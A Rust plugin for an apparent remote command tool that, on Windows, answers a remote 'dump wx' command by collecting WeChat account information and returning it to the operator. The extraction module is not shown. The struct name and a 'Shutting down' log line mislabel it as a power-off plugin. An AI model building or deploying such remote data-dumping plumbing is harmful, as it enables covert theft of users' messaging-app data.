use tracing::{info, warn};
use yizhan_plugin::Plugin;
use yizhan_protocol::command::{UserCommand, UserCommandResponse, UserCommandResult};

#[cfg(windows)]
mod dump;

#[derive(Default)]
pub struct YiZhanPowerOffPlugin {}

impl Plugin for YiZhanPowerOffPlugin {
    fn parse_command(&self, inputs: &[&str]) -> Option<(Option<String>, UserCommand)> {
        match inputs {
            ["dump", "wx"] => Some((
                None,
                UserCommand::PluginCommand("dump".to_string(), "wx".to_string()),
            )),
            _ => None,
        }
    }

    fn execute_command(&self, group_id: &str, content: &str) -> Option<UserCommandResult> {
        #[cfg(windows)]
        if matches!((group_id, content), ("dump", "wx")) {
            info!("Shutting down ...");

            Some(match dump::auto_find_wechat_info() {
                Err(err) => {
                    warn!("find wechat info error: {:?}", err);
                    UserCommandResult::Err(format!("find wechat info error: {:?}", err))
                }
                Ok(info) => UserCommandResult::Ok(UserCommandResponse::PluginCommand(format!(
                    "{:#?}",
                    info
                ))),
            })
        } else {
            None
        }

        #[cfg(not(windows))]
        None
    }
}
